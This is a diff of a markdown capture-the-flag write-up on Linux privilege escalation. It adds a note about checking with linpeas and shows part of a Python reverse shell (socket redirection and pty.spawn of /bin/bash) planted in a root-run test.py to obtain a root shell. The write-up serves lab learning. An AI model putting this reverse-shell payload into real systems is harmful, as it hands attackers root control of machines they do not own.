@@ -127,6 +127,9 @@ This explains why the scriptmanager user is able to modify a file owned by root.
 
 ![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311034919.png)
 
+### OR CHECK WITH LINPEAS :
+
+![](../../../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260311040455.png)
 
 ##### Then modify the test.py to reverse shell with root privileges :
 
@@ -139,8 +142,6 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 pty.spawn("/bin/bash")
 ```
-
-
 
 ##### Then wait a little and BOOM !
 
